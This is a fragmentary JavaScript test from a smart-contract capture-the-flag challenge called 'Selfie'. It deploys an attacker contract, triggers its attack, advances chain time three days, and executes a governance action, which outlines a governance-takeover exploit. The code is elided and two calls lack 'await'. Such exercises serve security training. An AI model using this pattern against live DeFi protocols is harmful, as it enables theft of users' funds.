...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const attackSelfieContract = await AttackSelfieFactory.deploy(
          this.pool.address,
          this.governance.address,
          this.token.address,
          TOKENS_IN_POOL
        ...
        // invoke attack
        attackSelfieContract.attack({from: attacker.address});

        // advance > required time delay for governance action execution
        await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]); // 3 days

        // execute governance action
        this.governance.executeAction(1);
    });
